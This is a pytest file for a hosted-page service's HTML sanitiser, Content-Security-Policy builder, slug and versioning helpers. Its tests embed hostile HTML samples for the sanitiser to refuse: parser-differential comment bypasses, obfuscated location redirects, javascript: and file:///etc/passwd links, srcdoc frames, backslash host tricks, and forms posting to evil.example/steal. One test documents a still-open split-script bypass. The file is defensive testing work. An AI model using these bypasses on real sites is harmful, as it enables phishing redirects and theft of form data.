"""agent/hosted.py: the slug, the sanitiser and the CSP, versions and previews (A3p-2 Task 1). No serving
yet -- these are pure functions plus the DB helpers they need; Task 2 wires them into `hosted.serve` and the
preview/publish tools."""

from __future__ import annotations

import threading
import time

import pytest

from agent import db, hosted
from agent.tests.conftest import TEST_DB_URL

PID = "pg_0123456789abcdef"
AGENT_BASE = "https://agent.test"
OWN_HOST = "x.business.test"

_FILLER = "Same-week appointments for families across the Peninsula. " * 12

# A good hosted page (Review Focus): a form to this page's own /t/form/{PID}, a tel: link, a Calendly
# iframe, inline style (both a <style> block and a style= attribute), and one inline <script> that only
# calls gtag -- everything the sanitiser allows, nothing it refuses.
GOOD = (
    '<html><head><meta charset="utf-8"><style>body{color:#222}</style></head>'
    '<body style="margin:0">'
    "<h1>Bright Smile Dental — Invisalign in Palo Alto</h1>"
    f"<p>{_FILLER}</p>"
    '<p><a href="tel:+16505550100">Call (650) 555-0100</a></p>'
    '<div><iframe src="https://calendly.com/brightsmile/consult"></iframe></div>'
    f'<form method="post" action="/t/form/{PID}"><input name="name"><button>Send</button></form>'
    "<script>gtag('event', 'page_view');</script>"
    "</body></html>"
)


def _biz_with_page(conn, biz_id: str) -> str:
    """A minimal business and an un-hosted page row (source 'hosted', no hostname yet) -- what a business
    has before its first hosted page is published. Pattern: agent/tests/fixtures.py's business_with_key and
    agent/tests/test_track.py's _page, without the API key or the owner-source page neither test needs."""
    conn.execute("INSERT INTO business (id, claim_state) VALUES (%s, 'draft')", (biz_id,))
    page_id = db.new_id("pg")
    conn.execute(
        "INSERT INTO page (id, business_id, source, url, status) VALUES (%s, %s, 'hosted', '', 'preview')",
        (page_id, biz_id),
    )
    return page_id


# ---------------------------------------------------------------- the slug


def test_slugify_and_reserved_names():
    assert hosted.slugify("Bright Smile Dental!") == "bright-smile-dental"
    assert hosted.slugify("  ") == "page"
    assert len(hosted.slugify("x" * 80)) == 40
    assert hosted.slugify("Ünïcode Café") == "unicode-cafe"


def test_slug_is_unique_and_never_changes_once_published(conn):
    page_a = _biz_with_page(conn, "biz_a")
    _biz_with_page(conn, "biz_b")
    _biz_with_page(conn, "biz_c")

    assert (
        hosted.hostname_for(conn, "biz_a", "Bright Smile Dental", "business.test")
        == "bright-smile-dental.business.test"
    )
    # publish a: a real publish (Task 2) would set exactly these two columns.
    conn.execute(
        "UPDATE page SET hostname = %s, status = 'published' WHERE id = %s",
        ("bright-smile-dental.business.test", page_a),
    )
    assert (
        hosted.hostname_for(conn, "biz_b", "Bright Smile Dental", "business.test")
        == "bright-smile-dental-2.business.test"
    )
    # a's hostname never moves, whatever name is passed next
    assert hosted.hostname_for(conn, "biz_a", "Renamed Clinic", "business.test") == "bright-smile-dental.business.test"
    # "www" is reserved -> skips straight to -2
    assert hosted.hostname_for(conn, "biz_c", "www", "business.test") == "www-2.business.test"


def test_hostname_for_never_trusts_a_stored_hostname_outside_the_domain(conn):
    """H22 (A3p-2 Task 3 review): a `hostname` column that does not end in `.<domain>` -- a foreign address, or
    one from before set_owner_url stopped writing the owner's own host there -- is never handed back; a fresh
    slug is minted instead, exactly as if the business had no hostname on file at all."""
    page_id = _biz_with_page(conn, "biz_a")
    conn.execute("UPDATE page SET hostname = %s WHERE id = %s", ("brightsmile.example", page_id))
    assert (
        hosted.hostname_for(conn, "biz_a", "Bright Smile Dental", "business.test")
        == "bright-smile-dental.business.test"
    )


# ---------------------------------------------------------------- the sanitiser


def test_sanitiser_accepts_a_good_page():
    assert hosted.sanitise(GOOD, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE) == []


def test_sanitiser_refuses_a_form_posting_elsewhere():
    bad = GOOD.replace(f'action="/t/form/{PID}"', 'action="https://formspree.io/f/xyz"')
    out = hosted.sanitise(bad, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    expected = (
        f"Forms must post to this page or to Admiry ({AGENT_BASE}/t/form/{PID}): "
        "https://formspree.io/f/xyz posts elsewhere."
    )
    assert out == [expected]


@pytest.mark.parametrize(
    "bad, sentence_start",
    [
        (
            '<script src="https://cdn.evil.example/x.js"></script>',
            "Scripts may load only from this page, Admiry or Google's tag hosts",
        ),
        ('<iframe src="https://evil.example/"></iframe>', "Frames may show only a booking page"),
        (
            '<meta http-equiv="refresh" content="0;url=https://elsewhere.example/">',
            "The page must not redirect",
        ),
        (
            # H19 fix round 1: this refusal no longer depends on the target host (the sentence changed --
            # see test_navigating_inline_scripts_are_refused for the fuller obfuscation/bypass coverage).
            '<script>window.location.href="https://elsewhere.example/"</script>',
            "Scripts on the page must not navigate away",
        ),
        ('<base href="https://elsewhere.example/">', "The page must not redirect"),
    ],
)
def test_sanitiser_refuses(bad, sentence_start):
    page = GOOD.replace("</body>", bad + "</body>")
    out = hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    assert len(out) == 1, out
    assert out[0].startswith(sentence_start), out[0]


def test_sanitiser_refuses_thin_or_huge_pages():
    thin = "<html><body><p>Hi there.</p></body></html>"
    out = hosted.sanitise(thin, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    assert len(out) == 1 and "real text" in out[0], out

    huge = GOOD.replace("</body>", ("<!-- " + "x" * 1_100_000 + " -->") + "</body>")
    out = hosted.sanitise(huge, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    assert len(out) == 1 and "too big" in out[0], out


# H19 fix round 1 (review Focus 1-5): a real security reviewer reproduced sanitiser bypasses (probe scripts
# in scratchpad/probes/a3p2-t1/) that html.parser's own parsing let through. Each test below is one of those
# bypasses, now refused.


@pytest.mark.parametrize(
    "bad_comment",
    [
        # Focus 1: real browsers close `<!-->`/`<!--->` immediately (the "abrupt-closing-of-empty-comment"
        # tokenizer state) -- everything after is live markup -- while html.parser keeps consuming to the
        # next real "-->", so the script right after was invisible to sanitise() even though a browser runs
        # it. The trailing "-->" in each payload is what made the smuggled script look, to html.parser, like
        # it was still safely inside the comment.
        '<!--><script src="https://evil.example/x.js"></script>-->',
        '<!---><script src="https://evil.example/x.js"></script>-->',
        # an unclosed comment: refused outright rather than reasoned about (H19), even though -- unlike the
        # two abrupt-closing shapes above -- browsers and html.parser agree an unclosed comment eats the
        # rest of the document (so this shape is not itself a live differential bypass).
        "<!-- forever open, no closing marker anywhere after this point",
    ],
)
def test_sanitiser_refuses_malformed_comments(bad_comment):
    page = GOOD.replace("</body>", bad_comment + "</body>")
    out = hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    assert out == ["Comments must be well-formed (<!-- … -->)."], out


def test_sanitiser_accepts_a_well_formed_comment_even_hiding_markup():
    # a properly closed comment is inert in both html.parser and a real browser -- nothing inside it ever
    # renders or runs, so hiding a "bad" script inside one is not a bypass and must stay accepted.
    page = GOOD.replace("</body>", '<!-- <script src="https://evil.example/x.js"></script> -->' + "</body>")
    assert hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE) == []


NAV_SENTENCE = "Scripts on the page must not navigate away (no location, window.open)."


@pytest.mark.parametrize(
    "script",
    [
        # Focus 2, every reviewer case: the old check only refused a `location.href`-style assignment to an
        # absolute URL on a different host, so all of these -- none of which is that exact shape -- passed.
        "location='https://elsewhere.example/'",  # bare location assignment
        "window.location='https://elsewhere.example/'",  # bare window.location assignment
        "top.location='https://elsewhere.example/'",  # bare top.location assignment
        "top.location.href='https://elsewhere.example/'",  # has the substring, refused before too
        "location['href']='https://elsewhere.example/'",  # bracket notation
        "window['location']='https://elsewhere.example/'",  # bracket notation, "location" as a string
        "location.href='//elsewhere.example/phish'",  # protocol-relative target (no "http" to match)
        "window['\\u006c\\u006fcation']='https://elsewhere.example/'",  # \uXXXX-escaped identifier
        "window.location.href='https://elsewhere.example/'",  # the original baseline case
        "top.open('https://elsewhere.example/')",  # window.open( family, not just window.
        "open('https://elsewhere.example/')",  # bare open(
        "x = document.URL",  # document.url, any case
    ],
)
def test_navigating_inline_scripts_are_refused(script):
    page = GOOD.replace("gtag('event', 'page_view');", script)
    out = hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    assert out == [NAV_SENTENCE], out


def test_navigates_ignores_a_legit_gtag_snippet():
    # the fix must not turn every inline script into a refusal -- gtag's own config/event calls have none
    # of "location", "open(" or "document.url" in them.
    assert not hosted._navigates("gtag('event', 'page_view');")
    assert hosted.sanitise(GOOD, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE) == []


def test_navigating_scripts_split_across_tags_is_a_known_residual_gap():
    # Focus 2's reviewer case "split across two script tags" builds the string "location" at JS RUNTIME via
    # string concatenation ('locat' + 'ion'), spread across two <script> tags. No static text/regex check
    # (this one included) can see "location" as a substring here -- it never appears contiguously in the
    # source, in one tag or concatenated across both. Closing this needs a real JS parser/evaluator, which
    # H19 deliberately does not attempt ("refuse, don't emulate browsers" -- not "implement one"). Recorded
    # here as a known, disclosed gap rather than silently left untested.
    page = GOOD.replace(
        "<script>gtag('event', 'page_view');</script>",
        "<script>var w = window;</script><script>w['locat' + 'ion'] = 'https://elsewhere.example/';</script>",
    )
    out = hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    assert out == [], out  # documents current behaviour -- NOT a claim that this is safe


@pytest.mark.parametrize("tag", ["embed", "object"])
def test_sanitiser_refuses_embed_and_object_outright(tag):
    # Focus 3: <embed>/<object> are refused regardless of host (even a booking host) -- only <iframe>/
    # <frame> stay allow-listed. object's own probe cases used both its "data" and (non-standard) "src".
    for bad in (f'<{tag} src="https://calendly.com/x">', f'<{tag} data="https://evil.example/payload.swf">'):
        page = GOOD.replace("</body>", bad + "</body>")
        out = hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
        assert out == ["Embedded objects are not allowed; use a booking frame."], (bad, out)


@pytest.mark.parametrize(
    "bad",
    [
        '<iframe srcdoc="<script>top.location=&quot;https://evil.example/phish&quot;</script>"></iframe>',
        '<div srcdoc="whatever, on any element"></div>',
    ],
)
def test_sanitiser_refuses_srcdoc_on_any_element(bad):
    # Focus 4: srcdoc bypasses every src-based host check by never naming a host at all.
    page = GOOD.replace("</body>", bad + "</body>")
    out = hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    assert out == ["Frames must load a booking page by address, not inline content."], out


SCHEME_SENTENCE = "Links and sources must use https (no javascript:, data: …)."


@pytest.mark.parametrize(
    "bad",
    [
        # Focus 5, one per listed attribute; the iframe case is the reviewer's own passing case.
        "<iframe src=\"javascript:top.location='https://evil.example/phish'\"></iframe>",
        '<a href="javascript:doEvil()">click</a>',
        '<form action="javascript:doEvil()"><input name="a"></form>',
        '<button formaction="javascript:doEvil()">go</button>',
        '<object data="javascript:doEvil()"></object>',
        '<video poster="javascript:doEvil()"></video>',
        '<svg><use xlink:href="javascript:doEvil()"></use></svg>',
        '<table background="vbscript:doEvil()"></table>',
        '<script src="data:text/javascript,alert(1)"></script>',
        '<iframe src="blob:https://evil.example/uuid"></iframe>',
        '<a href="file:///etc/passwd">click</a>',
    ],
)
def test_sanitiser_refuses_non_http_schemes(bad):
    page = GOOD.replace("</body>", bad + "</body>")
    out = hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    assert SCHEME_SENTENCE in out, (bad, out)


def test_bad_scheme_allows_relative_and_contact_links():
    assert hosted._bad_scheme("") is False
    assert hosted._bad_scheme("/t/form/pg_1") is False
    assert hosted._bad_scheme("#section") is False
    assert hosted._bad_scheme("mailto:x@example.com") is False
    assert hosted._bad_scheme("tel:+16505550100") is False
    assert hosted._bad_scheme("sms:+16505550100") is False
    assert hosted._bad_scheme("https://calendly.com/x") is False
    assert hosted._bad_scheme("java\tscript:alert(1)") is True  # tab inside the scheme name
    # H21 fix round 2, Review Focus 2: a leading or embedded C0 control must not hide the scheme either --
    # the old check only stripped tab/CR/LF, so these two both passed.
    assert hosted._bad_scheme("\x01javascript:alert(1)") is True  # leading C0 control
    assert hosted._bad_scheme("java\x00script:alert(1)") is True  # C0 control inside the scheme name


# ---------------------------------------------------------------- H44 (final review): host checks as a browser reads


SCRIPT_SENTENCE = "Scripts may load only from this page, Admiry or Google's tag hosts"
FORM_SENTENCE = f"Forms must post to this page or to Admiry ({AGENT_BASE}/t/form/{PID})"


@pytest.mark.parametrize(
    "bad, sentence_start",
    [
        # a browser reads "\" as "/" in an http(s) URL, and in a relative one on an http(s) page: "//evil.example"
        ('<script src="\\\\evil.example/x.js"></script>', SCRIPT_SENTENCE),
        ('<script src="/\\evil.example/x.js"></script>', SCRIPT_SENTENCE),
        ('<script src="https:\\\\evil.example\\x.js"></script>', SCRIPT_SENTENCE),
        # ... and trims the spaces around it, drops a tab or newline anywhere, and skips any slashes after http(s):
        ('<script src=" //evil.example/x.js"></script>', SCRIPT_SENTENCE),
        ('<script src="/\t/evil.example/x.js"></script>', SCRIPT_SENTENCE),
        ('<script src="https:///evil.example/x.js"></script>', SCRIPT_SENTENCE),
        ('<iframe src="\\\\evil.example/"></iframe>', "Frames may show only a booking page"),
        ('<base href="\\\\evil.example/">', "The page must not redirect"),
        ('<form action="\\\\evil.example/steal"><input name="a"></form>', FORM_SENTENCE),
        # a submit button's own formaction overrides its form's action: host-checked exactly like it
        (
            '<form action="/t/form/x"><button formaction="https://evil.example/steal">Send</button></form>',
            FORM_SENTENCE,
        ),
        ('<form><input type="submit" formaction="\\\\evil.example/steal"></form>', FORM_SENTENCE),
    ],
)
def test_sanitiser_host_checks_read_a_url_the_way_a_browser_does(bad, sentence_start):
    page = GOOD.replace("</body>", bad + "</body>")
    out = hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    assert len(out) == 1 and out[0].startswith(sentence_start), (bad, out)


def test_a_formaction_to_this_page_or_admiry_is_fine_and_is_named_when_it_is_not():
    admiry = f'<form action="/t/form/{PID}"><button formaction="{AGENT_BASE}/t/form/{PID}">Send</button></form>'
    here = '<form><button formaction="/t/form/x">Send</button><button formaction="">Go</button></form>'
    for fine in (admiry, here):
        page = GOOD.replace("</body>", fine + "</body>")
        assert hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE) == [], fine
    bad = GOOD.replace("</body>", '<button formaction="https://evil.example/steal">Send</button></body>')
    out = hosted.sanitise(bad, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    assert out == [f"{FORM_SENTENCE}: https://evil.example/steal posts elsewhere."]


def test_url_host_reads_a_url_the_way_a_browser_does():
    for url in ("\\\\evil.example/x", "/\\evil.example/x", "https:\\\\evil.example\\x", " \n//evil.example/x"):
        assert hosted._url_host(url) == "evil.example", url
    assert hosted._url_host("HTTPS:evil.example/x") == "evil.example"  # no slashes at all: still a host
    assert hosted._url_host("//[evil") == "//[evil"  # unparseable: a host of its own, matching nothing
    for same_page in ("", "#top", "?q=1", "/js/app.js", "js/app.js", "\\#top"):
        assert hosted._url_host(same_page) is None, same_page
    assert hosted._url_host("https://www.googletagmanager.com\\gtag\\js?id=AW-1") == "www.googletagmanager.com"


# ---------------------------------------------------------------- H21 fix round 2


EVENT_HANDLER_SENTENCE = "Inline event handlers (onclick, onload, …) are not allowed; use a <script> that listens."


def test_sanitiser_refuses_onclick():
    # Review Focus 1: runs inline JS under the CSP's 'unsafe-inline' with no <script> tag at all, so H19's
    # script-src/navigation checks never saw it.
    page = GOOD.replace("</body>", """<button onclick="location='https://evil.example/'">click</button></body>""")
    out = hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    assert out == [EVENT_HANDLER_SENTENCE], out


def test_sanitiser_refuses_onerror_case_insensitively():
    page = GOOD.replace("</body>", '<img src="/x.png" ONERROR="alert(1)">' + "</body>")
    out = hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    assert out == [EVENT_HANDLER_SENTENCE], out


def test_sanitiser_refuses_onload_on_body():
    page = GOOD.replace('<body style="margin:0">', '<body style="margin:0" onload="doThing()">')
    out = hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    assert out == [EVENT_HANDLER_SENTENCE], out


def test_sanitiser_accepts_a_page_with_no_event_handlers():
    # the fix must not turn every element into a refusal -- GOOD has plenty of ordinary attributes
    # (style, href, src, action, method, name) but none starting with "on".
    assert hosted.sanitise(GOOD, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE) == []


@pytest.mark.parametrize(
    "script_body",
    [
        "<!--\ncode();\n//-->",  # the traditional Annex-B form, closed with the (cosmetic) //-->
        "<!--\ncode();\n",  # the same idiom without the closing //--> -- this is what round 1 refused
    ],
)
def test_sanitiser_accepts_the_annex_b_comment_idiom_inside_a_script(script_body):
    # H21 fix round 2, Review Focus 3: a leading <!-- inside <script>...</script> is a valid ECMAScript
    # Annex B line comment (the historical "hide this script from browsers that don't know <script>" idiom)
    # -- not a comment for the raw scan to police, with or without a later closing //-->.
    page = GOOD.replace("<script>gtag('event', 'page_view');</script>", f"<script>{script_body}</script>")
    assert hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE) == []


def test_sanitiser_still_refuses_an_abrupt_comment_outside_a_script():
    # round 2 must not weaken round 1: a <!--> outside any <script> is still refused, even when a real
    # (harmless) <script> appears earlier in the same page.
    page = GOOD.replace("</body>", '<!--><script src="https://evil.example/x.js"></script>-->' + "</body>")
    out = hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    assert out == ["Comments must be well-formed (<!-- … -->)."], out


# ---------------------------------------------------------------- H21 fix round 3


def test_comment_scan_is_linear_in_the_number_of_scripts():
    # H21 fix round 3: a real regression -- round 2's _bad_comment called find("<!--", i) once per <script>
    # tag it skipped, unconditionally; with no comment anywhere in the document, every one of those calls
    # had to scan all the way to the end to confirm there was nothing left to find (a failed find() cannot
    # stop early), turning one skip-every-script pass into O(tags x bytes) -- 20,000 empty <script> tags
    # took ~2.9 s in _bad_comment alone and ~6.8 s for the whole sanitise() before this fix; round 1's
    # <script>-unaware scan did the same input in 0.3 ms. The fix caches the next "<!--"/"<script" position
    # across loop turns and only re-searches once the cursor has passed it.
    page = GOOD.replace("</body>", "<script></script>" * 20_000 + "</body>")
    started = time.perf_counter()
    out = hosted.sanitise(page, page_id=PID, own_host=OWN_HOST, agent_base=AGENT_BASE)
    elapsed = time.perf_counter() - started
    assert elapsed < 1.0, elapsed
    assert out == [], out  # 20,000 empty scripts, no comment, no navigation -- a clean page


def test_inject_adds_the_snippet_once_and_noindex_for_previews():
    snippet = f'<script async src="{AGENT_BASE}/t/admiry.js" data-page="{PID}"></script>'
    page = "<html><head></head><body><p>hi</p></body></html>"

    out = hosted.inject(page, snippet=snippet, noindex=False)
    assert out.count(snippet) == 1
    assert out.index(snippet) < out.index("</body>")

    # data-page already present -> untouched
    again = hosted.inject(out, snippet=snippet, noindex=False)
    assert again == out

    # noindex meta goes into <head>, added once even called twice
    once = hosted.inject(page, snippet=snippet, noindex=True)
    assert once.count('<meta name="robots" content="noindex">') == 1
    assert once.index('<meta name="robots" content="noindex">') < once.index("<body>")
    twice = hosted.inject(once, snippet=snippet, noindex=True)
    assert twice.count('<meta name="robots" content="noindex">') == 1


def test_inject_dedup_is_attribute_aware():
    # H19 fix round 1, Review Focus 7: the old dedup was a literal substring search for one exact spelling
    # (double quotes, that attribute order) -- an assistant that pasted the snippet with single quotes, or
    # in a different order, or wrote the noindex meta with its attributes swapped, was not recognised, and
    # inject() would add a second copy.
    snippet = f'<script async src="{AGENT_BASE}/t/admiry.js" data-page="{PID}"></script>'
    existing = (
        "<html><head><meta content='noindex' name='ROBOTS'></head>"
        f"<body><script data-page='{PID}' async src='{AGENT_BASE}/t/admiry.js'></script></body></html>"
    )
    out = hosted.inject(existing, snippet=snippet, noindex=True)
    assert out == existing
    assert out.count("<script") == 1
    assert out.count("<meta") == 1


def test_visible_text_strips_tags_and_collapses_whitespace():
    page = "<html><head><style>x{color:red}</style></head><body>  Hello   <b>world</b>\n!  </body></html>"
    assert hosted.visible_text(page) == "Hello world !"


def test_refused_joins_problems_for_str():
    e = hosted.Refused(["First problem.", "Second problem."])
    assert str(e) == "First problem. Second problem."
    assert e.problems == ["First problem.", "Second problem."]


# ---------------------------------------------------------------- the CSP


def test_a_previews_forms_may_post_only_to_the_public_form_endpoint():
    """The final re-review's optional hardening: a preview's `form-action` is path-scoped to `/t/form/` like its
    `connect-src` (H45); a live page keeps `'self' <agent base>`."""
    live = hosted.csp(AGENT_BASE)
    prev = hosted.csp(AGENT_BASE, preview=True)
    assert f"form-action 'self' {AGENT_BASE}; " in live
    assert f"form-action {AGENT_BASE}/t/form/; " in prev and "'self'" not in prev.split("form-action ")[1].split(";")[0]
    assert "sandbox allow-scripts allow-forms" in prev and "allow-same-origin" not in prev


def test_csp_names_the_agent_and_googles_hosts_and_nothing_else():
    out = hosted.csp(AGENT_BASE)
    assert out == (
        "default-src 'none'; "
        "style-src 'self' 'unsafe-inline' https:; "
        f"script-src 'self' 'unsafe-inline' {AGENT_BASE} "
        "https://www.googletagmanager.com https://www.google-analytics.com "
        "https://googleads.g.doubleclick.net https://www.google.com; "
        "img-src https: data:; "
        "font-src https: data:; "
        f"connect-src 'self' {AGENT_BASE} "
        "https://www.google-analytics.com https://www.googletagmanager.com "
        "https://googleads.g.doubleclick.net https://www.google.com https://stats.g.doubleclick.net; "
        "frame-src https://calendly.com https://*.calendly.com https://*.acuityscheduling.com "
        "https://*.squareup.com https://*.square.site https://www.google.com; "
        "object-src 'none'; "  # H19 fix round 1, Review Focus 3: belt-and-braces for the refused embed/object
        f"form-action 'self' {AGENT_BASE}; "
        "base-uri 'self'; "
        "frame-ancestors 'none'"
    )
    custom = hosted.csp(AGENT_BASE, frame_ancestors="https://www.admiry.ai")
    assert custom.endswith("frame-ancestors https://www.admiry.ai")
    assert "'none'" not in custom.rsplit("frame-ancestors", 1)[1]


def _directives(policy: str) -> dict[str, str]:
    return dict(d.strip().split(" ", 1) for d in policy.split(";"))


def test_a_previews_csp_is_sandboxed_and_reaches_only_the_public_t_endpoints():
    """H42 (final review): a preview is anyone's HTML, opened by whoever has the link -- a signed-in owner
    included. Its policy is a live page's with two changes: it runs sandboxed in an opaque origin (`sandbox
    allow-scripts allow-forms`, never `allow-same-origin`: its scripts run and its forms post, but nothing it sends
    carries a cookie or reads a same-origin answer), and it can fetch only the agent host's public, unauthenticated
    `/t/` endpoints (H45: one path-scoped `connect-src` source -- the tracking script's beacon and form send), never
    `/api`, `/connect` or `/mcp`, and no other host."""
    live, prev = hosted.csp(AGENT_BASE), hosted.csp(AGENT_BASE, preview=True)

    assert "sandbox" not in live
    assert prev.endswith("; sandbox allow-scripts allow-forms") and "allow-same-origin" not in prev
    assert _directives(prev)["connect-src"] == f"{AGENT_BASE}/t/"
    assert _directives(prev)["form-action"] == f"{AGENT_BASE}/t/form/"  # the re-review's hardening: forms too
    unchanged = {k: v for k, v in _directives(prev).items() if k not in ("connect-src", "form-action", "sandbox")}
    assert unchanged == {k: v for k, v in _directives(live).items() if k not in ("connect-src", "form-action")}
    framed = _directives(hosted.csp(AGENT_BASE, frame_ancestors="https://home.test", preview=True))
    assert framed["frame-ancestors"] == "https://home.test" and framed["sandbox"] == "allow-scripts allow-forms"


def test_headers_cache_and_robots_by_mode():
    live = hosted.headers(AGENT_BASE, preview=False)
    assert live["Cache-Control"] == "public, max-age=60"
    assert "X-Robots-Tag" not in live
    assert live["Referrer-Policy"] == "strict-origin-when-cross-origin"
    assert live["X-Content-Type-Options"] == "nosniff"

    prev = hosted.headers(AGENT_BASE, preview=True)
    assert prev["Cache-Control"] == "no-store"
    assert prev["X-Robots-Tag"] == "noindex"
    assert prev["Content-Security-Policy"] == hosted.csp(AGENT_BASE, preview=True)  # H42: sandboxed
    assert live["Content-Security-Policy"] == hosted.csp(AGENT_BASE)


# ---------------------------------------------------------------- versions and previews


def test_versions_are_linear_and_previews_expire(conn):
    page_id = _biz_with_page(conn, "biz_v")

    assert hosted.new_version(conn, page_id, "<html>1</html>", "T1", "hosted") == 1
    assert hosted.new_version(conn, page_id, "<html>2</html>", "T2", "hosted") == 2
    vs = hosted.versions(conn, page_id)
    assert [v["version"] for v in vs] == [2, 1]
    assert [v["title"] for v in vs] == ["T2", "T1"]

    token = hosted.save_preview(conn, page_id, "<html>preview</html>", "Preview")
    assert token.startswith("pv_")
    got = hosted.preview(conn, token)
    assert got is not None
    assert got["page_id"] == page_id
    assert got["html"] == "<html>preview</html>"
    assert got["title"] == "Preview"
    assert got["embed_origin"] is None

    conn.execute("UPDATE page_preview SET expires_at = now() - interval '1 hour' WHERE token = %s", (token,))
    assert hosted.preview(conn, token) is None

    assert hosted.prune_previews(conn) == 1
    assert conn.execute("SELECT count(*) AS n FROM page_preview").fetchone()["n"] == 0


def test_save_preview_records_embed_origin(conn):
    page_id = _biz_with_page(conn, "biz_w")
    token = hosted.save_preview(conn, page_id, "<html>x</html>", None, embed_origin="https://www.admiry.ai")
    assert hosted.preview(conn, token)["embed_origin"] == "https://www.admiry.ai"


def test_a_preview_carries_the_sections_an_admiry_page_was_built_from(conn):
    """A3p-2 Task 5: a page Admiry wrote keeps what it was built from beside its preview (publishing copies it onto
    the page row); an assistant's own HTML has none."""
    page_id = _biz_with_page(conn, "biz_s")
    sections = {"tree": "dentists", "copy": {"headline": "Invisalign in Palo Alto"}, "photos": [], "version": 1}
    token = hosted.save_preview(conn, page_id, "<html>x</html>", "T", sections=sections)
    assert hosted.preview(conn, token)["sections"] == sections
    assert hosted.preview(conn, hosted.save_preview(conn, page_id, "<html>y</html>", None))["sections"] is None


def test_new_version_race_is_serialised_by_an_advisory_lock(conn):
    # H19 fix round 1, Review Focus 6: without the advisory lock, two callers both read MAX(version) before
    # either INSERTs, and race to write the same (page_id, version) -- one loses to a UniqueViolation instead
    # of getting its own next version (reproduced with 8 concurrent callers by the reviewer's probe_db.py).
    page_id = _biz_with_page(conn, "biz_race")
    results: list[int] = []
    errors: list[str] = []
    barrier = threading.Barrier(2)

    def worker(i: int) -> None:
        c = db.connect(TEST_DB_URL)
        try:
            barrier.wait()
            results.append(hosted.new_version(c, page_id, f"<html>{i}</html>", f"T{i}", "hosted"))
        except Exception as e:  # noqa: BLE001 - a racing thread's failure must surface as a test failure, not a hang
            errors.append(f"{type(e).__name__}: {e}")
        finally:
            c.close()

    threads = [threading.Thread(target=worker, args=(i,)) for i in range(2)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()

    assert errors == [], errors
    assert sorted(results) == [1, 2], results
    rows = conn.execute("SELECT version FROM page_version WHERE page_id = %s ORDER BY version", (page_id,)).fetchall()
    assert [r["version"] for r in rows] == [1, 2]


# ---------------------------------------------------------------- config (H19 fix round 1, Review Focus 8)


def test_config_pages_domain_parsing(monkeypatch):
    # agent/tests/test_config.py does not exist in this repo (only test_mail_config.py), so this lives here
    # alongside the rest of A3p-2 Task 1's own coverage, per the fix-round instructions.
    from agent import config

    monkeypatch.delenv("AGENT_PAGES_DOMAIN", raising=False)
    assert config.load().pages_domain is None

    monkeypatch.setenv("AGENT_PAGES_DOMAIN", "Business.Dev.ADX.Admiry.AI.")
    assert config.load().pages_domain == "business.dev.adx.admiry.ai"

    monkeypatch.setenv("AGENT_PAGES_DOMAIN", "...")
    assert config.load().pages_domain is None

    monkeypatch.setenv("AGENT_PAGES_DOMAIN", "")
    assert config.load().pages_domain is None
